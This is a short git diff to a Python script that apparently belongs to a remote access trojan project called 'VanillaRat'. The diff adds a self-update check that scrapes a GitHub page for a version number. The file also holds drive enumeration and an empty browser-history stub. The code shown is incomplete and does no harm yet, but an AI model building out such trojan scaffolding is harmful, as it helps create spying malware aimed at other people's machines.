@@ -6,6 +6,8 @@ from sys import argv
 import os
 import webbrowser
 import platform
+import requests as r
+from bs4 import BeautifulSoup
 
 #import rotatescreen
 # def rotate_screen():
@@ -13,6 +15,7 @@ import platform
 #     rotate_screen.set_landscape_flipped()
 
 
+github_url = 'https://github.com/ZingKidd/VanillaRat/blob/main/main.py'
 
 drives = ["A:\\", "B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
 
@@ -62,5 +65,15 @@ def check_alive_drives(drives):
 def chrome_history():
     pass
 
-def update():
-    pass
+def update(github_url):
+    html_text = r.get(github_url).text
+    soup = BeautifulSoup(html_text, 'html.parser')
+    latest_versions_location = soup.find_all('span', {"class":"pl-c1"})
+    # print(searchfor[1])
+    for i in latest_versions_location[1]:
+        latest_version = float(i)
+        print(latest_version)
+        if VERSION < latest_version:
+            print('Updating...')
+        else:
+            print('You are fine!')
